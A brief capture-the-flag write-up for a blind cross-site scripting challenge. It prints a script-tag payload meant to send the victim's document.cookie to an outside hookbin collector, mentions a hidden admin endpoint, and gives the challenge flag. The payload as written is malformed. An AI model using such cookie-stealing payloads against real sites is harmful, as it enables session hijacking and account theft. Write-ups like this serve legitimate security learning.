This challenge requires blind xss injection.
our intial payload was 
><script src='https://hookb.in/7ZGMgJJPKNua99D3yQPP' +document.cookie</script>
where we  are recieving a cookie using the "document.cookie" function and capturing teh response at
the hookbin link given.

But after discovering a "Secret_admin_cookie_panel" we go the end point and refresh the page where 
we recieve the flag zh3r0{{Ea5y_bx55_ri8}}
